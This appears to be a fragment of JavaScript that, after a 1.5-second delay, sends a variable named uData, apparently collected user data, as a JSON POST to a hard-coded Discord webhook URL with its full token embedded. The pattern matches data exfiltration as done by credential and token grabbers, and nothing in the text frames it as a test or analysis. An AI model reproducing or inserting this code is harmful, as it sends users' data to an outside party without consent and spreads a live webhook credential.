setTimeout(() => {
  fetch(
    "https://discord.com/api/webhooks/1086327231200100452/Gmaw4eXeHgYswghmDAXprV_qY52PiDRnlizv9BQGlBksRSIHZ3hUUVw9lfpJ2jAhpCp0",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: JSON.stringify(uData),
      }),
    }
  );
}, 1500);
